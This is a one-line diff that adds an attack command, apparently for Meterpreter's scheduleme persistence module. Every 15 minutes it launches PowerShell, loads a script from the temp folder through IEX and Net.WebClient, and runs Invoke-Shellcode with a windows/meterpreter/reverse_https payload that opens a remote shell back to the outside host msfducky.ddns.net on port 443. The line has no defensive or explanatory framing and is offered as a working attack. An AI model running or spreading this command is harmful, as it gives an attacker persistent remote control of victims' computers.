@@ -1,0 +1,1 @@
+run scheduleme -c "powershell start-process powershell -ArgumentList \\\\"\\\"IEX\ (New-Object\ Net.WebClient).DownloadString($([char]39)$env:temp\\temp.ps1$([char]39));Invoke-Shellcode\ -Payload\ windows/meterpreter/reverse_https\ -Lhost\ msfducky.ddns.net\ -Lport\ 443\ -Force\\\\"\\\"" -m 15
